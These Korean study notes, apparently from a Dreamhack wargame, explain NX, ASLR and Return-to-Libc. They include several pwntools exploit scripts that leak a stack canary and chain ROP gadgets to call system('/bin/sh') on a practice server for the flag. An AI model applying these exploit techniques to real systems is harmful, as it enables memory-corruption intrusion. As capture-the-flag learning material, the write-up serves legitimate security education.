**No-eXecute(NX)**

****Checksec을 이용한 NX 확인****

```
$ checksec ./nx
[*] '/home/dreamhack/nx'
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

NX를 인텔은 **XD(eXecute Disable)** , 

AMD는 NX, 

윈도우는 **DEP(Data Execution Prevention)** , 

ARM에서는 **XN(eXecute Never)**

//

**Address Space Layout Randomization(ASLR)**은 바이너리가 실행될 때마다 스택, 힙, 공유 라이브러리 등을 임의의 주소에 할당하는 보호 기법

|  | $ cat /proc/sys/kernel/randomize_va_space |
| --- | --- |
|  | 2 |

리눅스에서 이 값은 0, 1, 또는 2의 값을 가질 수 있습니다. 각 ASLR이 적용되는 메모리 영역은 다음과 같습니다.

- No ASLR(0): ASLR을 적용하지 않음
- Conservative Randomization(1): 스택, 힙, 라이브러리, vdso 등
- Conservative Randomization + brk(2): (1)의 영역과 `brk`로 할당한 영역

//

코드 영역에는 유용한 코드 가젯들과 함수가 포함되어 있습니다. 반환 주소를 셸 코드로 직접 덮는 대신, 이들을 활용하면 NX와 ASLR을 우회하여 공격할 수 있습니다. 관련된 대표적인 공격 방법으로는 **Return-to-Libc (RTL)**과 **Return Oriented Programming (ROP)**가 있습니다

- **Address Space Layout Randomization(ASLR):** 메모리를 무작위 주소에 할당하는 보호 기법. 최신 커널들은 대부분 적용되어 있음. 리눅스에서는 페이지 단위로 할당이 이루어지므로 하위 12비트는 변하지 않는다는 특징이 있음.
- **NX(No-eXecute bit)**: 프로세스의 각 세그먼트에 필요한 권한만 부여하는 보호 기법. 일반적으로 코드 영역에는 읽기와 실행을, 나머지 영역에는 읽기와 쓰기 권한이 부여됨.

//

# **Return To Library**

NX로 인해 공격자가 버퍼에 주입한 셸 코드를 실행하기는 어려워졌지만, 스택 버퍼 오버플로우 취약점으로 반환 주소를 덮는 것은 여전히 가능했습니다. 그래서 공격자들은 실행 권한이 남아있는 코드 영역으로 반환 주소를 덮는 공격 기법을 고안했습니다.

프로세스에 실행 권한이 있는 메모리 영역은 일반적으로 바이너리의 코드 영역과 바이너리가 참조하는 라이브러리의 코드 영역입니다.

이 중, 공격자들이 주목한 것은 다양한 함수가 구현된 라이브러리였습니다. 몇몇 라이브러리에는 공격에 유용한 함수들이 구현되어있습니다. 예를 들어, 리눅스에서 C언어로 작성된 프로그램이 참조하는 libc에는 `system`, `execve`등 프로세스의 실행과 관련된 함수들이 구현되어 있습니다.

공격자들은 libc의 함수들로 NX를 우회하고 셸을 획득하는 공격 기법을 개발하였고, 이를 **Return To Libc**라고 이름 지었습니다. 다른 라이브러리도 공격에 활용될 수 있으므로 이 공격 기법은 **Return To Library**라고도 불립니다. 유사한 공격 기법으로 **Return To PLT**

//

카나리 우회

```python
#!/usr/bin/env python3
# Name: rtl.py
from pwn import *

p = process('./rtl')
e = ELF('./rtl')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak canary
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)
```

exploit

```python
#!/usr/bin/env python3
# Name: rtl.py
from pwn import *

p = process('./rtl')
e = ELF('./rtl')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak canary
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
system_plt = e.plt['system']
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8
payload += p64(ret)  # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

pause()
p.sendafter(b'Buf: ', payload)

p.interactive()
```

//

return to library

```python
from pwn import *
from pwn import p64

p=remote("host3.dreamhack.games",8797)
buf=b'A'*0x39 
p.sendafter("Buf: ",buf)
p.recvuntil(buf)
canary=b'\x00'+p.recvn(7)

ret_gadget=p64(0x400285)
rbp_dummy=b'B'*0x8
poprdi_gadget=p64(0x400853)
binsh_addr=p64(0x400874)
sys_plt=p64(0x4005d0)

payload=b'A'*0x38+canary+rbp_dummy+ret_gadget+poprdi_gadget+binsh_addr+sys_plt
p.sendlineafter("Buf: ",payload)
p.interactive()
```

1.checksec 명령어로 보호기법 확인

canary와 nx

2.코드분석으로 버퍼오버플로우 가능성 확인

buf ~ RBP 까지의 거리는 56 이기 때문에, 'A'를 57개 입력하면 카나리 앞의 '\x00'가 제거되어서 canary leak

3.exploit

```python
from pwn import *
from pwn import p64

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 8797)
e = ELF("./rtl")
libc = e.libc
r = ROP(e)

# [0] Gathering Information
system_plt = e.symbols['system']
sh = next(e.search(b'/bin/sh'))
pop_rdi = r.find_gadget(['pop rdi'])[0]
ret = r.find_gadget(['ret'])[0]
slog("system@plt", system_plt)
slog("/bin/sh", sh)
slog("pop rdi", pop_rdi)
slog("ret", ret)

# [1] Leak Canary
buf2sfp = 0x40
buf2cnry = 0x40 - 0x8
payload = b'A'*(buf2cnry + 1)
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recvn(7))
slog("Canary", canary)

# [2] Exploit
payload = b'A' * buf2cnry
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(sh)
payload += p64(system_plt)

pause()
p.sendafter("Buf: ", payload)

p.interactive()
```

![ReturnToLibrary.jpg](https://github.com/JoWoonJi/Dreamhack_Wargame/blob/main/SystemHacking/img/ReturnToLibrary.jpg)

플래그 획득!
